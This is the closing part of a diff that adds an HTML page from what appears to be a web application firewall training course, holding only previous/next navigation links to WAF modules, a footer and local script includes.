+        <a href="../module4.html" title="Module 4: Transparent WAF Policy" accesskey="p" class="btn btn-primary left"><i class="fa fa-arrow-circle-left" aria-hidden="true"></i> Previous</a>
+       
+       
+          <a href="../../../waf111/waf111.html" title="WAF 111 - Protecting Yourself Against the OWASP Top 10" accesskey="n" class="btn btn-primary right">Next <i class="fa fa-arrow-circle-right" aria-hidden="true"></i></a>
+       
+     </div>
+     </div>
+    
+
+    </article>
+  </div>
+
+</div>
+
+
+  <div id="clouddocs-footer"></div>
+  <!-- Bootstrap core JavaScript
+  ================================================== -->
+  <!-- Placed at the end of the document so the pages load faster -->
+
+  <script src="../../../_static/js/index.js"></script>
+  <script src="../../../_static/js/jquery.appear.js"></script>
+  <script src="../../../_static/js/printThis.js"></script>
+  <script src="../../../_static/js/bootstrap.min.js"></script>
+  <script src="../../../_static/js/clouddocs.js"></script>
+  <script src="../../../_static/js/CoveoJsSearch.Lazy.min.js"></script>
+  </body>
+</html>
